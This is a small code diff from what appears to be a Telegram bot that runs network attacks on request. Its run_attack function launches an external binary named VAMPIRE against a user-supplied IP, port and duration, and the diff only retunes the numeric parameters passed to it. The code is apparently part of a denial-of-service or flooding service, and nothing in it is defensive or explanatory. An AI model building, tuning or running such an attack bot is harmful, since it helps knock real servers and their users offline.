@@ -140,7 +140,7 @@ async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./VAMPIRE {ip} {port} {duration} 1024 1000 ",
+            f"./VAMPIRE {ip} {port} {duration} 9 1200 ",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
